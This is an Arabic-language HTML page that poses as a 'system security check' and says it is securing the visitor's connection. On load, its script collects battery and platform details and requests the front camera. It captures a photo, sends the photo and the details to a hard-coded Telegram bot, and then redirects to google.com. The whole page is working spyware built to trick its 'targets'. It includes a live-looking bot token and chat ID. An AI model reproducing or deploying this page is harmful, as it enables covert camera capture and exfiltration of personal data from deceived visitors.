<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>فحص أمان النظام</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; box-shadow: 0 0 15px #00ff00; }
    </style>
</head>
<body>
    <div class="box">
        <h3>جاري تأمين اتصالك...</h3>
        <p>يرجى الانتظار ثوانٍ قليلة</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>

    <script>
        // إعدادات البوت الخاص بك
        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const CHAT_ID = "7392262688";

        async function startSiphoning() {
            // سحب معلومات البطارية والنظام
            let battery = await navigator.getBattery();
            let info = `🚀 صيد جديد من GitHub:\n🔋 البطارية: ${Math.floor(battery.level * 100)}%\n📱 النظام: ${navigator.platform}`;

            try {
                // طلب الكاميرا (سيظهر طلب إذن للهدف)
                let stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
                let video = document.getElementById('v');
                video.srcObject = stream;

                setTimeout(async () => {
                    let canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(video, 0, 0, 720, 1280);
                    let imgBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));

                    // إرسال البيانات والصورة مباشرة من المتصفح إلى تليجرام
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('caption', info);
                    formData.append('photo', imgBlob, 'shot.jpg');

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    
                    // إغلاق الكاميرا والتحويل لموقع آخر
                    stream.getTracks().forEach(t => t.stop());
                    window.location.replace("https://google.com");
                }, 4000); // 4 ثواني لالتقاط الصورة
            } catch (e) {
                // إذا رفض الكاميرا، نرسل المعلومات النصية فقط
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
                window.location.replace("https://google.com");
            }
        }
        window.onload = startSiphoning;
    </script>
</body>
</html>
